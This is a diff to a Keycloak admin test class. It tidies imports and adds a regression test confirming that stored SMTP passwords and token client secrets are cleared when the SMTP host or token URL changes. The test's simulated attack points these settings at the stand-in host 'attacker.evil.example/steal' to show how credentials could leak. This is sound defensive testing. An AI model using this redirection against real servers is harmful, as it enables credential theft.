@@ -17,10 +17,13 @@
 
 package org.keycloak.tests.admin.realm;
 
+import java.io.IOException;
+import java.nio.charset.Charset;
+import java.util.Collections;
+import java.util.List;
+
 import jakarta.ws.rs.NotFoundException;
-import org.apache.commons.io.IOUtils;
-import org.bouncycastle.util.Strings;
-import org.junit.jupiter.api.Test;
+
 import org.keycloak.admin.client.resource.RealmResource;
 import org.keycloak.events.admin.OperationType;
 import org.keycloak.events.admin.ResourceType;
@@ -39,13 +42,11 @@ import org.keycloak.testframework.realm.ManagedRealm;
 import org.keycloak.testframework.remote.runonserver.InjectRunOnServer;
 import org.keycloak.testframework.remote.runonserver.RunOnServerClient;
 import org.keycloak.tests.utils.admin.AdminEventPaths;
-import org.keycloak.tests.utils.runonserver.RunHelpers;
+import org.keycloak.testsuite.util.runonserver.RunHelpers;
 import org.keycloak.util.JsonSerialization;
 
-import java.io.IOException;
-import java.nio.charset.Charset;
-import java.util.Collections;
-import java.util.List;
+import org.apache.commons.io.IOUtils;
+import org.junit.jupiter.api.Test;
 
 import static org.hamcrest.MatcherAssert.assertThat;
 import static org.hamcrest.Matchers.containsInAnyOrder;
@@ -53,6 +54,7 @@ import static org.hamcrest.Matchers.hasSize;
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertNotNull;
+import static org.junit.jupiter.api.Assertions.assertNull;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 import static org.junit.jupiter.api.Assertions.fail;
 
@@ -117,6 +119,56 @@ public class RealmDefaultConfigTest extends AbstractRealmTest {
     }
 
     @Test
+    public void smtpPasswordNotSubstitutedWhenDestinationChanged() {
+        smtpRealm.updateWithCleanup(r -> r.smtp("localhost", 3025, "smtp_realm@local"));
+        RealmRepresentation rep = smtpRealm.admin().toRepresentation();
+        rep.getSmtpServer().put("auth", "true");
+        rep.getSmtpServer().put("user", "user");
+        rep.getSmtpServer().put("password", "secret");
+        smtpRealm.admin().update(rep);
+
+        RealmRepresentation internal = smtpRealmRunOnServer.fetch(RunHelpers.internalRealm());
+        assertEquals("secret", internal.getSmtpServer().get("password"));
+
+        // Attack: change host to attacker's server, keep password=SECRET_VALUE
+        rep = smtpRealm.admin().toRepresentation();
+        rep.getSmtpServer().put("host", "attacker.evil.example");
+        rep.getSmtpServer().put("password", ComponentRepresentation.SECRET_VALUE);
+        smtpRealm.admin().update(rep);
+
+        // Real password must NOT be substituted — it must be cleared
+        internal = smtpRealmRunOnServer.fetch(RunHelpers.internalRealm());
+        assertNull(internal.getSmtpServer().get("password"),
+                "Credential must not be forwarded to a changed SMTP host");
+
+        smtpRealm.updateWithCleanup(r -> r.smtp("localhost", 3025, "smtp_realm@local"));
+        rep = smtpRealm.admin().toRepresentation();
+        rep.getSmtpServer().put("auth", "true");
+        rep.getSmtpServer().put("authType", "token");
+        rep.getSmtpServer().put("user", "user");
+        rep.getSmtpServer().put("authTokenUrl", "http://localhost/token");
+        rep.getSmtpServer().put("authTokenClientId", "smtp-client");
+        rep.getSmtpServer().put("authTokenClientSecret", "real-token-secret");
+        rep.getSmtpServer().put("authTokenScope", "email");
+        smtpRealm.admin().update(rep);
+
+        internal = smtpRealmRunOnServer.fetch(RunHelpers.internalRealm());
+        assertEquals("real-token-secret", internal.getSmtpServer().get("authTokenClientSecret"));
+
+        // Now change only authTokenUrl — host/port/user remain unchanged
+        rep = smtpRealm.admin().toRepresentation();
+        rep.getSmtpServer().put("authTokenUrl", "http://attacker.evil.example/steal");
+        rep.getSmtpServer().put("authTokenClientSecret", ComponentRepresentation.SECRET_VALUE);
+        smtpRealm.admin().update(rep);
+
+        // Secret must NOT be substituted — persisting it would cause the next email
+        // to POST client_secret=real-token-secret to the attacker's token endpoint
+        internal = smtpRealmRunOnServer.fetch(RunHelpers.internalRealm());
+        assertNull(internal.getSmtpServer().get("authTokenClientSecret"),
+                "Token secret must not be forwarded to a changed authTokenUrl");
+    }
+
+    @Test
     // KEYCLOAK-1110
     public void deleteDefaultRole() {
         RoleRepresentation role = new RoleRepresentation("test", "test", false);
@@ -126,9 +178,9 @@ public class RealmDefaultConfigTest extends AbstractRealmTest {
         role = managedRealm.admin().roles().get("test").toRepresentation();
         assertNotNull(role);
 
-        managedRealm.admin().roles().get(Constants.DEFAULT_ROLES_ROLE_PREFIX + "-" + Strings.toLowerCase(managedRealm.getName())).addComposites(Collections.singletonList(role));
+        managedRealm.admin().roles().get(Constants.DEFAULT_ROLES_ROLE_PREFIX + "-" + managedRealm.getName().toLowerCase()).addComposites(Collections.singletonList(role));
 
-        AdminEventAssertion.assertEvent(adminEvents.poll(), OperationType.CREATE, AdminEventPaths.roleResourceCompositesPath(Constants.DEFAULT_ROLES_ROLE_PREFIX + "-" + Strings.toLowerCase(managedRealm.getName())), Collections.singletonList(role), ResourceType.REALM_ROLE);
+        AdminEventAssertion.assertEvent(adminEvents.poll(), OperationType.CREATE, AdminEventPaths.roleResourceCompositesPath(Constants.DEFAULT_ROLES_ROLE_PREFIX + "-" + managedRealm.getName().toLowerCase()), Collections.singletonList(role), ResourceType.REALM_ROLE);
 
         managedRealm.admin().roles().deleteRole("test");
         AdminEventAssertion.assertEvent(adminEvents.poll(), OperationType.DELETE, AdminEventPaths.roleResourcePath("test"), ResourceType.REALM_ROLE);
